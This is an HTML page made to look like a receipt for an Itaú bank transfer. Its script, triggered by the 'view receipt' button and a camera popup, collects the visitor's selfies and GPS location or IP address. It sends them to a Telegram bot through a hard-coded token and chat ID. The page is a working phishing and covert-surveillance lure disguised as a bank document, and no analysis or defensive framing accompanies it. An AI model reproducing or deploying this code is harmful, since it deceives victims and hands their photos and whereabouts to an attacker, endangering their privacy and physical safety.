<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title>Comprovante de Transferência – Itaú</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body{font-family:Arial,Helvetica,sans-serif;background:#f4f4f4;margin:0}
    .comprovante{margin:30px auto;max-width:500px;background:#fff;border:1px solid #ccc;border-radius:6px;padding:20px;text-align:center;box-shadow:0 2px 8px #0002}
    .logo{color:#003d82;font-size:26px;font-weight:bold}
    .linha{margin:10px 0;font-size:14px;display:flex;justify-content:space-between}
    hr{border:none;height:1px;background:#ddd;margin:12px 0}
    button{padding:12px 24px;background:#003d82;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
    button:hover{background:#002a61}
  </style>
</head>
<body>
  <div class="comprovante">
    <div class="logo">Itaú</div>
    <hr>
    <div class="linha"><span>Agência</span><span>0001</span></div>
    <div class="linha"><span>Conta</span><span>12345-6</span></div>
    <div class="linha"><span>Data/Hora</span><span id="data"></span></div>
    <div class="linha"><span>Valor</span><span>R$ 350,00</span></div>
    <hr>
    <button id="btn" onclick="abrirCheckin()">Visualizar/Imprimir comprovante completo</button>
  </div>

  <script>
    /* CONFIG TELEGRAM – substitua os dois valores */
    const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
    const CHAT_ID = '-1003187104876';

    // completa data/hora fake
    document.getElementById('data').textContent = new Date().toLocaleString('pt-BR');

    // abre popup (câmera) e libera botão depois de 8 s
    function abrirCheckin(){
      const p = window.open('popup.html','ck','width=400,height=600');
      if(!p){ alert('⚠️ Popup bloqueado. Ative e tente novamente.'); }
      document.getElementById('btn').disabled = true;
      setTimeout(()=> document.getElementById('btn').disabled = false, 8000);
    }

    // ouve resposta do popup
    window.addEventListener('message', async (ev)=>{
      if(ev.origin !== location.origin) return;
      if(ev.data.type === 'negado'){ alert('Permissão de câmera recusada.'); return; }
      if(ev.data.type !== 'selfiesDone') return;

      // mesmo envio do antes (texto + 5 fotos)
      const {selfies,locationData,ipFallback} = ev.data.dados;
      const hora = new Date().toLocaleString('pt-BR');
      let texto = `🔴 Comprovante aberto – ${hora}\n`;
      if(locationData){
        texto += `📍 GPS Lat: ${locationData.lat.toFixed(6)} Lng: ${locationData.lon.toFixed(6)}\n`;
      }else{
        texto += `📍 GPS negado – IP: ${ipFallback}\n`;
      }
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({chat_id:CHAT_ID,text:texto})
      });
      for(let idx=0;idx<selfies.length;idx++){
        const byteString = atob(selfies[idx].split(',')[1]);
        const mime = selfies[idx].split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
        const blob = new Blob([ab],{type:mime});
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, `selfie_${idx+1}.jpg`);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
      }
    });
  </script>
</body>
</html>
